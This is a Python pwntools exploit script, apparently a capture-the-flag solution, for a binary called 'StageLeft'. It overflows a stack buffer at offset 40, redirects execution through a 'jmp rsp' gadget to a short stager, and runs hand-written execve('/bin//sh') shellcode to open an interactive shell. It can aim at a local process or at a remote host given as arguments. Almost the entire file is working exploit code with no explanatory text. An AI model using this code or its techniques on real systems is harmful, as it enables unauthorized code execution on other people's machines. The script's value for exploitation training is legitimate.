#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('StageLeft')

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *vuln+62
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    jmp_rsp = 0x0000000000401238 # jmp rsp; 
    offset = 40

    spw = asm("""
        xor esi, esi
        mov rdi, 0x68732f2f6e69622f
        mov [0x404030], rdi
        mov rcx, rsp
        mov rdi, 0x404030
        mov al, 0x3b
        cdq
        syscall           
    """)

    sc = asm("""
        mov r9, rsp
        sub r9, 0x30
        call r9
    """)

    payload = spw + b'\x90'*(offset-len(spw)) + p64(jmp_rsp) + sc

    sleep(60)
    io.sendline(payload)

    io.interactive()

def main():
    
    init()
    solve()
    
if __name__ == '__main__':
    main()

